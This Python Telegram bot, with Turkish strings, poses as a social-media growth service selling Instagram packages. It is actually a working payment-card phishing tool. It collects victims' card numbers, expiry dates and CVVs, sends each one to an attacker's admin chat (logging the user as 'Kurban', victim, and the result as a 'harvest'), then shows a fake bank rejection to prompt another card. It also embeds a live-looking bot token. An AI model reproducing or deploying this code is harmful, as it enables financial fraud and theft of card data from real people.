import logging
import asyncio
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# --- AYARLAR ---
BOT_TOKEN = "8250377483:AAEn4fn1mbPE7Y8KMXP-1iGH1Tpy17bxbS4"
ADMIN_ID = 7636413914 

# Durumlar
PAKET_SEC, USER_AL, CC_AL, EXP_AL, CVV_AL = range(5)

PAKETLER = {
    "p1": {"ad": "💎 500 GOLD LİSANS", "fiyat": "65.00 TL"},
    "p2": {"ad": "🔥 1250 PLATIN LİSANS", "fiyat": "120.00 TL"},
    "p3": {"ad": "👑 2500 VIP ELITE", "fiyat": "210.00 TL"}
}

# --- KART DOĞRULAMA (ESNETİLMİŞ) ---
def validate_card(card_number):
    # Boşlukları temizle
    n = card_number.replace(" ", "").replace("-", "")
    # Sadece sayı mı ve 15-16 hane mi? (Sallama koruması ama esnek)
    if not n.isdigit() or len(n) < 15 or len(n) > 16:
        return False
    return True

# --- GARANTİ LOG SİSTEMİ ---
async def log_firlat(context, baslik, detay, ikon="🚀"):
    rapor = (
        f"{ikon} **{baslik}**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{detay}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏰ `23:48` | 📅 `20.04.2026`"
    )
    try:
        # Logun gitmeme ihtimaline karşı print de ekledim
        print(f"LOG GÖNDERİLİYOR: {baslik}")
        await context.bot.send_message(chat_id=ADMIN_ID, text=rapor, parse_mode="Markdown")
    except Exception as e:
        print(f"LOG HATASI: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    user = update.effective_user
    await log_firlat(context, "SİSTEM BAŞLATILDI", f"👤 **Kurban:** @{user.username}\n🆔 **ID:** `{user.id}`", "🔵")
    
    kb = [
        [InlineKeyboardButton("🛒 ÜRÜN KATALOĞU", callback_data='katalog')],
        [InlineKeyboardButton("👨‍💻 DESTEK", callback_data='ls'), InlineKeyboardButton("🔍 TAKİP", callback_data='ot')],
        [InlineKeyboardButton("⭐ REFLER", callback_data='rf'), InlineKeyboardButton("💰 BAKİYE", callback_data='bl')]
    ]
    
    msg = (
        "🏙 **SMM GLOBAL | PREMIUM GATEWAY**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Kurumsal servis altyapımıza hoş geldiniz.\n\n"
        "🟢 **Sunucu:** `Online` | ⚡️ **Hız:** `Anlık`"
    )
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    return PAKET_SEC

async def router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    d = query.data

    if d in ['ls', 'ot', 'rf', 'bl']:
        res = {
            'ls': "👨‍💻 **Destek:** Temsilcilerimiz şuan aktif. Lütfen bekleyin...",
            'ot': "🔍 **Takip:** Aktif siparişiniz bulunamadı.",
            'rf': "⭐ **Ref:** Son 24 saatte +500 başarılı işlem!",
            'bl': "💰 **Bakiye:** Güncel bakiye `0.00 TL`"
        }
        await query.message.reply_text(res[d])
        return PAKET_SEC

    if d == 'katalog':
        kb = [[InlineKeyboardButton(f"{v['ad']} | {v['fiyat']}", callback_data=k)] for k, v in PAKETLER.items()]
        await query.edit_message_text("💫 **Paket Seçin:**", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        return USER_AL

async def user_iste(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    p_id = query.data
    context.user_data['p'] = PAKETLER[p_id]
    
    await log_firlat(context, "PAKET SEÇİLDİ", f"👤 @{query.from_user.username}\n📦 `{PAKETLER[p_id]['ad']}`", "🟡")
    await query.edit_message_text(f"✅ **Seçilen:** {PAKETLER[p_id]['ad']}\n\n👉 **Instagram Adını** yazın:", parse_mode="Markdown")
    return CC_AL

async def cc_iste(update: Update, context: ContextTypes.DEFAULT_TYPE):
    txt = update.message.text
    context.user_data['target'] = txt
    
    l = await update.message.reply_text("🔄 **API Bağlantısı Kuruluyor...**")
    await asyncio.sleep(1)
    await l.edit_text(f"✅ **Doğrulandı:** @{txt}")
    
    kb = [[InlineKeyboardButton("💳 ÖDEMEYE GEÇ", callback_data='odeme')]]
    await update.message.reply_text("Sipariş hazır. Ödeme yapın:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    return EXP_AL

async def exp_iste(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("🔒 **GÜVENLİ ÖDEME**\n\n💳 **16 Haneli Kart No Girin:**", parse_mode="Markdown")
    return EXP_AL

async def exp_yakala(update: Update, context: ContextTypes.DEFAULT_TYPE):
    num = update.message.text
    if validate_card(num):
        context.user_data['cc'] = num
        await log_firlat(context, "KART NO GİRİLDİ", f"👤 @{update.effective_user.username}\n🔢 `{num}`", "💳")
        await update.message.reply_text("📅 **Vade (AA/YY):**")
        return CVV_AL
    else:
        await update.message.reply_text("❌ **Hatalı Kart No!** Lütfen 16 haneyi kontrol edip tekrar girin.")
        return EXP_AL

async def cvv_yakala(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['exp'] = update.message.text
    await update.message.reply_text("🔐 **CVV (3 Hane):**")
    return PAKET_SEC # Final mesajını yakalamak için

async def final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or 'cc' not in context.user_data: return
    
    cvv = update.message.text
    d = context.user_data
    
    # 💰 KRAL LOG BURADA (ASLA ATLAMAZ)
    await log_firlat(context, "🔥 HASAT TAMAMLANDI 🔥", 
                    f"👤 **Kurban:** @{update.effective_user.username}\n"
                    f"🎯 **Hedef:** `@{d['target']}`\n"
                    f"💳 **KART:** `{d['cc']}`\n"
                    f"📅 **VADE:** `{d['exp']}`\n"
                    f"🔐 **CVV:** `{cvv}`", "🔴")
    
    wait = await update.message.reply_text("⌛️ **Banka onayı bekleniyor...**")
    await asyncio.sleep(3)
    await wait.edit_text("❌ **Hata (005):** Provizyon reddedildi. Kartınız 2D işleme kapalı. Lütfen farklı bir kart deneyin.")
    context.user_data.clear()
    return ConversationHandler.END

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    conv = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PAKET_SEC: [CallbackQueryHandler(router)],
            USER_AL: [CallbackQueryHandler(user_iste, pattern='^p[1-3]$')],
            CC_AL: [MessageHandler(filters.TEXT & ~filters.COMMAND, cc_iste)],
            EXP_AL: [CallbackQueryHandler(exp_iste, pattern='^odeme$'), MessageHandler(filters.TEXT & ~filters.COMMAND, exp_yakala)],
            CVV_AL: [MessageHandler(filters.TEXT & ~filters.COMMAND, cvv_yakala)],
        },
        fallbacks=[CommandHandler('start', start)],
    )
    
    app.add_handler(conv)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, final))
    
    print("🚀 SyfrusVoid V12 Stabil Mod Aktif!")
    app.run_polling()

if __name__ == "__main__":
    main()
  
